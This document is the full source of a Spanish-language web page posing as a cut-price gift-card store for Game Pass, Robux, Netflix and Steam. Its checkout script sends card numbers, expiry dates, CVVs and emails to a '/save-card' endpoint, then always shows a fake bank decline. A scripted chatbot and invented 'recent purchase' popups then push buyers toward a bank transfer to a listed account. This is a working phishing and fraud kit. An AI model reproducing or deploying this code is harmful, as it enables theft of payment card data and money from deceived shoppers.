<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tienda de Gift Cards | Game Pass y Robux</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <style>
        /* Reset general */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f1f1f1;
            color: #333;
        }

        /* --- Header y Navegaci√≥n --- */
        header {
            background: #333;
            color: white;
            padding: 20px 0;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        header h1 {
            font-size: 2.5em;
            font-weight: 600;
        }

        nav {
            margin-top: 10px;
        }

        nav a {
            color: white;
            text-decoration: none;
            padding: 10px 15px;
            font-size: 1.1em;
            transition: background-color 0.3s;
        }

        nav a:hover {
            background-color: #555;
            border-radius: 5px;
        }

        /* --- Contenido Principal --- */
        main {
            padding: 40px 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .section-title {
            text-align: center;
            font-size: 2em;
            margin-bottom: 30px;
            color: #555;
        }

        /* --- Grid de Productos --- */
        .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 30px;
        }

        .product-card {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }

        .product-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }

        .product-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-bottom: 1px solid #eee;
        }

        .product-info {
            padding: 20px;
        }

        .product-info h3 {
            font-size: 1.4em;
            margin-bottom: 5px;
            color: #333;
        }

        .product-info p {
            font-size: 1.1em;
            color: #777;
            margin-bottom: 15px;
        }

        .product-info button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 1em;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .product-info button:hover {
            background-color: #0056b3;
        }

        /* --- Panel de Pago --- */
        #paymentPanel {
            display: none;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            max-width: 600px;
            margin: 40px auto;
        }

        #paymentPanel h2 {
            font-size: 1.8em;
            margin-bottom: 20px;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }

        #paymentPanel label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }

        #paymentPanel input[type="email"],
        #paymentPanel input[type="text"],
        #paymentPanel input[type="number"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1em;
        }
        
        .input-error {
            border-color: red !important;
            box-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
        }

        .payment-method-selection {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }

        .payment-method-selection label {
            display: flex;
            align-items: center;
            font-weight: 400;
            cursor: pointer;
        }
        
        .card-details-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .full-width {
            grid-column: 1 / -1;
        }

        #payButton {
            background-color: #2c9b6f;
            color: white;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 5px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #payButton:hover {
            background-color: #247a56;
        }

        #transferencia {
            border: 1px dashed #007bff;
            padding: 15px;
            margin-top: 15px;
            background-color: #f0f8ff;
            display: none;
            border-radius: 5px;
        }
        
        .card-input-container {
            position: relative;
        }
        
        .card-icon {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 1.5em;
            color: #ccc;
        }
        
        #cardStatus {
            font-size: 0.9em;
            margin-top: -10px;
            margin-bottom: 10px;
            padding-left: 5px;
            min-height: 20px; 
        }

        #errorMessage {
            color: red;
            background-color: #ffe0e0;
            border: 1px solid red;
            padding: 10px;
            border-radius: 5px;
            margin-top: 15px;
            display: none;
            font-weight: 600;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2c9b6f;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* --- Footer --- */
        footer {
            background: #222;
            color: white;
            text-align: center;
            padding: 20px 0;
            margin-top: 50px;
        }
        
        /* --- Chat Flotante --- */
        .chat-toggle {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            font-size: 1.5em;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            z-index: 1001;
            transition: background-color 0.3s;
        }
        
        .chat-toggle:hover {
            background-color: #45a049;
        }

        #chat-window {
            position: fixed;
            bottom: 90px;
            right: 20px;
            width: 300px;
            height: 400px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
            display: none;
            flex-direction: column;
            overflow: hidden;
            z-index: 1000;
        }

        .chat-header {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            text-align: center;
            font-weight: 600;
        }

        #chat-body {
            flex-grow: 1;
            padding: 10px;
            overflow-y: auto;
            background-color: #f9f9f9;
        }

        .chat-input {
            display: flex;
            border-top: 1px solid #ccc;
        }

        #chat-input-field {
            flex-grow: 1;
            padding: 10px;
            border: none;
            resize: none;
        }

        .chat-input button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .chat-input button:hover {
            background-color: #45a049;
        }
        
        .message {
            margin-bottom: 10px;
            padding: 8px 12px;
            border-radius: 15px;
            max-width: 80%;
            word-wrap: break-word;
        }

        .user-message {
            background-color: #dcf8c6;
            align-self: flex-end;
            margin-left: auto;
        }

        .ai-message {
            background-color: #ebebeb;
            align-self: flex-start;
        }

        #typing-indicator {
            font-style: italic;
            color: #777;
            padding: 5px 12px;
            display: none;
        }
        
        /* --- Prueba Social Flotante --- */
        #social-proof-alert {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            opacity: 0;
            transform: translateX(-100%);
            transition: opacity 0.5s, transform 0.5s;
            z-index: 999;
            display: flex;
            align-items: center;
        }

        #social-proof-alert.show {
            opacity: 1;
            transform: translateX(0);
        }

        #social-proof-alert i {
            color: #FFC107; /* Color dorado para las estrellas */
            margin-right: 5px;
        }

        .social-proof-icon {
            font-size: 1.8em;
            margin-right: 10px;
            color: #007bff;
        }
    </style>
</head>
<body>

    <header>
        <h1>üéÆ Tienda de C√≥digos Digitales GC üí∏</h1>
        <nav>
            <a href="#products" onclick="scrollToSection('products')">Productos</a>
            <a href="#about" onclick="scrollToSection('about')">Acerca de</a>
            <a href="#contact" onclick="scrollToSection('contact')">Contacto</a>
        </nav>
    </header>

    <main>
        <div id="social-proof-alert">
            <i class="social-proof-icon fas fa-shopping-cart"></i>
            <div>
                <span id="alert-text"></span>
                <div id="alert-stars"></div>
            </div>
        </div>

        <section id="products">
            <h2 class="section-title">Nuestras Ofertas Digitales</h2>
            <div class="products-grid">
                
                <div class="product-card" onclick="showPaymentPanel('Xbox Game Pass Ultimate (3 Meses)', 5.00)">
                    <img src="img/gamepass-card.png" alt="Xbox Game Pass Ultimate">
                    <div class="product-info">
                        <h3>Xbox Game Pass Ultimate</h3>
                        <p>3 Meses de Acceso Total</p>
                        <p style="font-size: 1.5em; color: #2c9b6f;">$5.00 USD</p>
                        <button>Comprar Ahora</button>
                    </div>
                </div>

                <div class="product-card" onclick="showPaymentPanel('Robux (5,000)', 10.00)">
                    <img src="img/robux-card.png" alt="Robux 5,000">
                    <div class="product-info">
                        <h3>5,000 Robux</h3>
                        <p>Para desbloquear el mundo de Roblox</p>
                        <p style="font-size: 1.5em; color: #2c9b6f;">$10.00 USD</p>
                        <button>Comprar Ahora</button>
                    </div>
                </div>

                <div class="product-card" onclick="showPaymentPanel('Netflix Gift Card (6 Meses)', 10.00)">
                    <img src="img/netflix-card.png" alt="Netflix Gift Card">
                    <div class="product-info">
                        <h3>Netflix Gift Card</h3>
                        <p>6 Meses de Servicio Premium</p>
                        <p style="font-size: 1.5em; color: #2c9b6f;">$10.00 USD</p>
                        <button>Comprar Ahora</button>
                    </div>
                </div>

                <div class="product-card" onclick="showPaymentPanel('Steam Wallet ($50 USD)', 15.00)">
                    <img src="img/steam-card.png" alt="Steam Wallet $50">
                    <div class="product-info">
                        <h3>Steam Wallet</h3>
                        <p>Cr√©dito de $50 USD para juegos</p>
                        <p style="font-size: 1.5em; color: #2c9b6f;">$15.00 USD</p>
                        <button>Comprar Ahora</button>
                    </div>
                </div>

            </div>
        </section>

        <section>
            <div id="paymentPanel">
                <h2 id="panelTitle">Comprar Producto</h2>
                <div style="margin-bottom: 20px;">
                    <span style="font-size: 1.2em; font-weight: 600;" id="totalAmount">Total: $0.00 USD</span>
                </div>

                <div class="full-width">
                    <label for="email">Correo Electr√≥nico para el C√≥digo:</label>
                    <input type="email" id="email" placeholder="ejemplo@correo.com" required>
                </div>
                
                <div style="border-top: 1px solid #eee; padding-top: 15px;">
                    <p style="margin-bottom: 10px; font-weight: 600;">Selecciona M√©todo de Pago:</p>
                    <div class="payment-method-selection">
                        <label>
                            <input type="radio" name="paymentMethod" value="tarjeta" checked> Tarjeta de Cr√©dito/D√©bito
                        </label>
                        <label>
                            <input type="radio" name="paymentMethod" value="transferencia"> Transferencia Bancaria (KLAR)
                        </label>
                    </div>
                </div>
                
                <div id="tarjeta">
                    <div class="full-width card-input-container">
                        <label for="tarjeta-numero">N√∫mero de Tarjeta:</label>
                        <input type="text" id="tarjeta-numero" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this); detectCardType(this.value);" required>
                        <i id="cardIcon" class="card-icon fas fa-credit-card"></i>
                    </div>
                    <div class="full-width" id="cardStatus"></div>
                    
                    <div class="card-details-grid">
                        <div>
                            <label for="expiracion">Fecha de Caducidad (MM/AA):</label>
                            <input type="text" id="expiracion" placeholder="MM/AA" maxlength="5" oninput="formatExpiryDate(this)" required>
                        </div>
                        <div>
                            <label for="cvv">CVV:</label>
                            <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
                        </div>
                    </div>
                </div>

                <div id="transferencia">
                    <p style="font-weight: 600; color: #007bff;">Instrucciones de Pago por Transferencia</p>
                    <p>Banco: **KLAR**</p>
                    <p>Cuenta CLABE: **661180006948807615**</p>
                    <p>Beneficiario: **Tu Tienda GC**</p>
                    <p style="margin-top: 10px;">*El c√≥digo se enviar√° a tu correo **solo despu√©s** de verificar la transferencia.</p>
                </div>
                
                <div id="errorMessage"></div>

                <button id="payButton" onclick="processPayment()">
                    <div id="spinner" class="spinner"></div>
                    Pagar y Recibir C√≥digo
                </button>
            </div>
        </section>

        <section id="about" style="padding-top: 50px;">
            <h2 class="section-title">Acerca de Nosotros</h2>
            <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);">
                <p>Somos distribuidores digitales de c√≥digos de Game Pass, Robux, Netflix y Steam. Nuestro compromiso es ofrecer precios competitivos y entrega inmediata. Todos nuestros c√≥digos son verificados y 100% funcionales. La seguridad es nuestra prioridad, por lo que tus datos de pago est√°n protegidos (aunque simulamos un rechazo bancario para fines de inventario interno).</p>
            </div>
        </section>

        <section id="contact" style="padding-top: 50px;">
            <h2 class="section-title">Cont√°ctanos</h2>
            <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); text-align: center;">
                <p>üìß Correo de Soporte: **soporte@tutiendagc.com**</p>
                <p>üí¨ O utiliza nuestro chat flotante para preguntas r√°pidas.</p>
            </div>
        </section>
    </main>

    <footer>
        <p>&copy; 2024 Tienda de Gift Cards GC. Todos los derechos reservados.</p>
    </footer>

    <div id="chat-window">
        <div class="chat-header">Asistente Virtual (Bot)</div>
        <div id="chat-body">
            <div class="message ai-message">¬°Hola! Soy tu asistente. Puedo ayudarte con preguntas sobre **precios**, **c√≥digos**, o **m√©todos de pago**.</div>
            <div id="typing-indicator">Escribiendo...</div>
        </div>
        <div class="chat-input">
            <input type="text" id="chat-input-field" placeholder="Escribe tu mensaje..." onkeypress="if(event.keyCode==13) sendMessage()">
            <button onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
        </div>
    </div>
    
    <button class="chat-toggle" onclick="toggleChat()"><i class="fas fa-comments"></i></button>
    
    <script>
        let currentProduct = { name: '', price: 0 };
        const paymentPanel = document.getElementById('paymentPanel');
        const totalAmountSpan = document.getElementById('totalAmount');
        const transferPanel = document.getElementById('transferencia');
        const cardPanel = document.getElementById('tarjeta');
        const cardIcon = document.getElementById('cardIcon');
        const cardStatus = document.getElementById('cardStatus'); 
        const expiryInput = document.getElementById('expiracion');
        const cvvInput = document.getElementById('cvv');
        const cardNumInput = document.getElementById('tarjeta-numero');
        const emailInput = document.getElementById('email'); 
        const errorMessage = document.getElementById('errorMessage');
        const chatWindow = document.getElementById('chat-window');
        const chatBody = document.getElementById('chat-body');
        const chatInputField = document.getElementById('chat-input-field');
        const typingIndicator = document.getElementById('typing-indicator');
        const socialProofAlert = document.getElementById('social-proof-alert');
        const alertText = document.getElementById('alert-text');
        const alertStars = document.getElementById('alert-stars');
        
        const purchases = [
            { name: "Game Pass", user: "Ra√∫l G.", stars: 5 },
            { name: "5,000 Robux", user: "Ana P.", stars: 4 },
            { name: "Game Pass", user: "Carlos M.", stars: 5 },
            { name: "Netflix Gift Card", user: "Laura F.", stars: 5 }, 
            { name: "Steam Wallet $50", user: "Marco T.", stars: 4 }, 
            { name: "5,000 Robux", user: "Luc√≠a S.", stars: 5 }
        ];

        function generateStars(count) {
            let starHtml = '';
            for (let i = 0; i < 5; i++) {
                starHtml += `<i class="fa${i < count ? 's' : 'r'} fa-star"></i>`;
            }
            return starHtml;
        }

        function showSocialProof() {
            socialProofAlert.classList.remove('show');
            setTimeout(() => {
                const purchase = purchases[Math.floor(Math.random() * purchases.length)];
                
                alertText.innerHTML = `¬°<strong>${purchase.user}</strong> acaba de comprar: ${purchase.name}!`;
                alertStars.innerHTML = generateStars(purchase.stars);
                
                socialProofAlert.classList.add('show');
                
                setTimeout(() => {
                    socialProofAlert.classList.remove('show');
                }, 5000); 
                
            }, 500);
            const nextTime = Math.random() * (20000 - 10000) + 10000;
            setTimeout(showSocialProof, nextTime);
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(showSocialProof, 3000); 
        });

        function scrollToSection(id) {
            const section = document.getElementById(id);
            if (section) {
                section.scrollIntoView({ behavior: 'smooth', block: 'start' });
            } else {
                console.error(`La secci√≥n con ID '${id}' no fue encontrada.`);
            }
        }
        
        function showPaymentPanel(productName, productPrice) {
            currentProduct = { name: productName, price: productPrice };
            document.getElementById('panelTitle').textContent = `Comprar ${productName}`;
            totalAmountSpan.textContent = `Total: $${productPrice.toFixed(2)} USD`;
            paymentPanel.style.display = 'block';
            errorMessage.style.display = 'none';
            paymentPanel.scrollIntoView({ behavior: 'smooth' });
        }

        document.querySelectorAll('input[name="paymentMethod"]').forEach((radio) => {
            radio.addEventListener('change', () => {
                transferPanel.style.display = (radio.value === 'transferencia') ? 'block' : 'none';
                cardPanel.style.display = (radio.value === 'tarjeta') ? 'block' : 'none';
                cardNumInput.classList.remove('input-error');
                cardStatus.textContent = '';
                errorMessage.style.display = 'none';
            });
        });

        function validateLuhn(val) {
            let sum = 0;
            let alt = false;
            for (let i = val.length - 1; i >= 0; i--) {
                let num = parseInt(val[i], 10);
                if (alt) {
                    num *= 2;
                    if (num > 9) {
                        num = (num % 10) + 1;
                    }
                }
                sum += num;
                alt = !alt;
            }
            return sum % 10 === 0;
        }

        function detectCardType(number) {
            const cleanNumber = number.replace(/\s/g, '');
            let type = 'Unknown';
            
            if (/^4[0-9]{12,18}$/.test(cleanNumber)) {
                type = 'Visa';
                cardIcon.className = 'card-icon fab fa-cc-visa';
                cardIcon.style.color = '#1a1f71';
            } 
            else if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) {
                type = 'Mastercard';
                cardIcon.className = 'card-icon fab fa-cc-mastercard';
                cardIcon.style.color = '#ff6c00';
            }
            else if (/^3[47][0-9]{13}$/.test(cleanNumber)) {
                type = 'American Express';
                cardIcon.className = 'card-icon fab fa-cc-amex';
                cardIcon.style.color = '#0070e0';
            } 
            else {
                cardIcon.className = 'card-icon fas fa-credit-card';
                cardIcon.style.color = '#ccc';
            }

            if (cleanNumber.length >= 4) {
                updateCardStatus(type, cleanNumber);
            } else {
                cardStatus.textContent = '';
            }

            return type;
        }

        function updateCardStatus(type, cleanNumber) {
            let statusText = '';
            let color = '#333';
            const isLuhnValid = validateLuhn(cleanNumber);
            
            if (type !== 'Unknown') {
                statusText += `Tipo: üí≥ **${type}** | `;
            }

            if (cleanNumber.length >= 12) {
                if (isLuhnValid) {
                    statusText += 'Estado: ‚úÖ N√∫mero V√°lido (Luhn)';
                    color = '#2c9b6f';
                } else {
                    statusText += 'Estado: ‚ùå N√∫mero Inv√°lido (Luhn)';
                    color = 'red';
                }
            } else if (cleanNumber.length > 0) {
                 statusText += 'Escribiendo...';
                 color = '#777';
            } else {
                statusText = '';
            }
            
            cardStatus.innerHTML = statusText.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
            cardStatus.style.color = color;
        }

        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 0) {
                let formatted = value.match(/.{1,4}/g).join(' ');
                input.value = formatted;
            }
        }

        function formatExpiryDate(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
        }

        function validateCardFields() {
            let isValid = true;
            expiryInput.classList.remove('input-error');
            cvvInput.classList.remove('input-error');
            cardNumInput.classList.remove('input-error');

            const cardNum = cardNumInput.value.replace(/\s+/g, '');
            if (cardNum.length < 13 || cardNum.length > 19 || !/^\d+$/.test(cardNum)) { 
                cardNumInput.classList.add('input-error');
                errorMessage.textContent = 'El n√∫mero de tarjeta debe tener entre 13 y 19 d√≠gitos.';
                isValid = false;
            } else if (!validateLuhn(cardNum)) {
                cardNumInput.classList.add('input-error');
                errorMessage.textContent = 'El n√∫mero de tarjeta es inv√°lido (no pasa la prueba Luhn). Por favor, rev√≠salo.';
                isValid = false;
            }

            const cvv = cvvInput.value;
            if (cvv.length < 3 || cvv.length > 4 || /\D/.test(cvv)) { 
                cvvInput.classList.add('input-error');
                if (isValid) {
                    errorMessage.textContent = 'El CVV debe ser de 3 o 4 d√≠gitos.';
                }
                isValid = false;
            }

            const expiry = expiryInput.value;
            const [monthStr, yearStr] = expiry.split('/');
            
            if (!monthStr || !yearStr || monthStr.length !== 2 || yearStr.length !== 2) {
                expiryInput.classList.add('input-error');
                if (isValid) {
                    errorMessage.textContent = 'La fecha de caducidad debe ser MM/AA.';
                }
                isValid = false;
            } else {
                const currentYear = new Date().getFullYear() % 100;
                const currentMonth = new Date().getMonth() + 1;
                const month = parseInt(monthStr, 10);
                const year = parseInt(yearStr, 10);
                if (month < 1 || month > 12) {
                    expiryInput.classList.add('input-error');
                    if (isValid) {
                        errorMessage.textContent = 'El mes de caducidad es incorrecto.';
                    }
                    isValid = false;
                } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    expiryInput.classList.add('input-error');
                    if (isValid) {
                        errorMessage.textContent = 'La tarjeta est√° caducada.';
                    }
                    isValid = false;
                }
            }

            return isValid;
        }

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(String(email).toLowerCase());
        }

        async function processPayment() { 
            errorMessage.style.display = 'none';
            
            const email = emailInput.value.trim();
            emailInput.classList.remove('input-error');
            if (!validateEmail(email)) {
                emailInput.classList.add('input-error');
                errorMessage.textContent = 'Por favor, introduce un correo electr√≥nico v√°lido para enviarte el c√≥digo.';
                errorMessage.style.display = 'block';
                return;
            }

            const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
            
            if (paymentMethod === 'tarjeta') {
                if (!validateCardFields()) {
                    errorMessage.style.display = 'block';
                    return;
                }
                
                document.getElementById('spinner').style.display = 'block';

                const cardData = {
                    email: email,
                    producto: currentProduct.name,
                    monto: currentProduct.price.toFixed(2),
                    numero_tarjeta: cardNumInput.value.replace(/\s+/g, ''),
                    tipo_tarjeta: detectCardType(cardNumInput.value), 
                    expiracion: expiryInput.value,
                    cvv: cvvInput.value,
                    timestamp: new Date().toISOString()
                };
                
                // C√ìDIGO CLAVE: ENV√çA DATOS A server.js EN RENDER
                try {
                    const response = await fetch('/save-card', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(cardData)
                    });
                    
                    if (!response.ok) {
                        console.error('‚ö†Ô∏è Error al guardar en MongoDB (revisar logs de Render):', response.statusText);
                    } else {
                        console.log('‚úÖ Datos enviados correctamente a MongoDB.');
                    }
                } catch (error) {
                    console.error('‚ùå Error de red al intentar conectar con el servidor:', error);
                }
            } else {
                 document.getElementById('spinner').style.display = 'block';
            }


            // Simulaci√≥n de espera de la pasarela de pago (3 segundos)
            setTimeout(() => {
                document.getElementById('spinner').style.display = 'none';
                
                if (paymentMethod === 'tarjeta') {
                    errorMessage.textContent = 'Lo sentimos, el banco ha rechazado tu transacci√≥n. Verifica si el rechazo es por l√≠mite o fallo del banco.';
                    errorMessage.style.display = 'block';
                } else {
                    alert(`Confirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la cuenta KLAR: 661180006948807615. Tu c√≥digo ser√° enviado al correo ${email} al recibir el pago.`);
                    paymentPanel.style.display = 'none';
                }

            }, 3000); 
        }
        
        // --- L√ìGICA DE CHAT SIMULADO ---

        function toggleChat() {
            if (chatWindow.style.display === 'flex') {
                chatWindow.style.display = 'none';
            } else {
                chatWindow.style.display = 'flex';
                chatInputField.focus();
                chatBody.scrollTop = chatBody.scrollHeight;
            }
        }

        function addMessage(text, sender) {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${sender}-message`;
            messageDiv.innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>'); 
            chatBody.appendChild(messageDiv);
            chatBody.scrollTop = chatBody.scrollHeight;
        }

        function sendMessage() {
            const text = chatInputField.value.trim();
            if (text === '') return;

            addMessage(text, 'user');
            chatInputField.value = '';

            simulateAIResponse(text);
        }
        
        function simulateAIResponse(userText) {
            const text = userText.toLowerCase();
            let response = "";
            let typingDelay = 1500;

            typingIndicator.style.display = 'block';
            chatBody.scrollTop = chatBody.scrollHeight;
            
            if (text.includes("ya pagu√©") || text.includes("hice el pago") || text.includes("realice el pago") || text.includes("esperar c√≥digo")) {
                response = "¬°Gracias por realizar tu pago! El c√≥digo digital se enviar√° a tu correo una vez verificado. Por favor, ten en cuenta que el tiempo de espera es de **hasta 24 horas**.";
                typingDelay = 2000;
            } 
            else if (text.includes("precio") || text.includes("costo") || text.includes("cuanto cuesta")) {
                response = "Actualmente, Game Pass cuesta $5.00 USD, 5,000 Robux cuesta $10.00 USD, **Netflix 6 Meses cuesta $10.00 USD** y Steam $50 USD cuesta $15.00 USD. ¬°Son ofertas limitadas!";
            } else if (text.includes("codigo") || text.includes("clave")) {
                response = "Una vez confirmado el pago, el c√≥digo digital se env√≠a autom√°ticamente a tu correo electr√≥nico en menos de 5 minutos.";
            } else if (text.includes("pago") || text.includes("transferencia") || text.includes("tarjeta")) {
                response = "Aceptamos **Transferencias Bancarias** (con los datos visibles en el formulario) y **Tarjeta de Cr√©dito/D√©bito** (Visa/Mastercard). Ten en cuenta que el pago con tarjeta est√° fallando actualmente, por lo que recomendamos la transferencia.";
            } else if (text.includes("hola") || text.includes("saludos")) {
                response = "¬°Hola! ¬øBuscas Game Pass, Robux, Netflix o Steam? Puedo darte informaci√≥n sobre los precios y el proceso de compra.";
            } else if (text.includes("ayuda") || text.includes("problema")) {
                response = "Si tienes un problema con una compra ya realizada, por favor, env√≠a un correo electr√≥nico a soporte@tutiendagc.com. Para dudas sobre la compra, preg√∫ntame aqu√≠.";
            } else {
                response = "Disculpa, a√∫n estoy aprendiendo. Por favor, pregunta sobre **'precios'**, **'c√≥digos'**, o **'m√©todos de pago'**.";
                typingDelay = 2500;
            }

            setTimeout(() => {
                typingIndicator.style.display = 'none';
                addMessage(response, 'ai');
            }, typingDelay);
        }
    </script>
</body>
</html>
